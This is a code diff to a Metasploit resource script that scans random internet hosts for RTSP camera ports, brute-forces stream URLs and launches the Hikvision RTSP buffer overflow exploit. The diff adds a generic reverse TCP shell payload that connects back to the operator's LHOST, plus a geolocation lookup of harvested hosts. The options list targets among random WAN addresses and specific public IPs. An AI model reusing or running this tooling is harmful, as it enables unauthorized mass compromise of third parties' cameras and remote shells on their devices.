@@ -6,7 +6,7 @@
 # [OPTIONS]
 # setg SAVE_DB true - Save workspace mosquito to database.xml
 # setg LIMMIT 1000 - Limmit the number of random WAN hosts to search
-# setg CHOST 192.168.1.71 - LHOST address to use in payload delivery
+# setg LHOST 192.168.1.71 - LHOST address to use in payload delivery
 # setg RANDOM_HOSTS true - To instruct db_nmap to random search in WAN for hosts with ports open
 # setg RHOSTS 201.203.27.251 159.121.101.207 - To instruct db_nmap to scan hosts for ports open.
 # -
@@ -80,6 +80,22 @@
       end
       print_line("")
       run_single("services")
+
+      ## hosts geolocation
+      nse = "/usr/bin/geoiplookup"
+      if (File.exist?(nse))
+         print_line("Geoiplookup Geolocation Reports")
+         print_line("===============================")
+         print_line("")
+         ## Mapping database hosts (loop)
+         framework.db.hosts.map(&:address).each do |sHost|
+            geo_location = `geoiplookup #{sHost}|cut -d ':' -f2|tr -d '\n'`
+            print_line("host:#{sHost} - #{geo_location}")
+         end
+         print_line("")
+         Rex::sleep(1.5)
+      end
+
       ## Read the database 
       print_good("Sellecting target hosts from msf database.")
       xhost = framework.db.hosts.map(&:address).join(' ')
@@ -143,19 +159,19 @@
 
 
          ## Make sure we have LHOST option set
-         if (framework.datastore['CHOST'] == nil or framework.datastore['CHOST'] == '')
-         print_error("[ERROR] CHOST option not set.")
+         if (framework.datastore['LHOST'] == nil or framework.datastore['LHOST'] == '')
+         print_error("[ERROR] LHOST option not set.")
          Rex::sleep(2.0)
            err = %Q|
 
     Remark
     ------
-    This resource script requires CHOST option set to be abble
+    This resource script requires LHOST option set to be abble
     to send a payload to target hosts to spawn a session back.
 
-    Set your local host (CHOST)
+    Set your local host (LHOST)
     ---------------------------
-    [execute] setg CHOST 192.168.1.71
+    [execute] setg LHOST 192.168.1.71
     [execute] resource rtsp-url-brute.rc
 
            |
@@ -166,7 +182,7 @@
            File.delete("ip_range.txt") if File.exist?("ip_range.txt")
            return nil
          else
-            local_ip = "#{framework.datastore['CHOST']}"
+            local_ip = "#{framework.datastore['LHOST']}"
          end
 
          ## Run gather/brute-force modules
@@ -174,7 +190,8 @@
               print_warning("Remote Target port: 554:5554:8554 rtsp found")
               Rex::sleep(1.0)
               run_single("use exploit/linux/misc/hikvision_rtsp_bof")
-              run_single("set CHOST #{local_ip}")
+              run_single("set PAYLOAD generic/shell_reverse_tcp")
+              run_single("set LHOST #{local_ip}")
               run_single("set VERBOSE true")
               print_line("")
               run_single("services -c name -S rtsp -R")
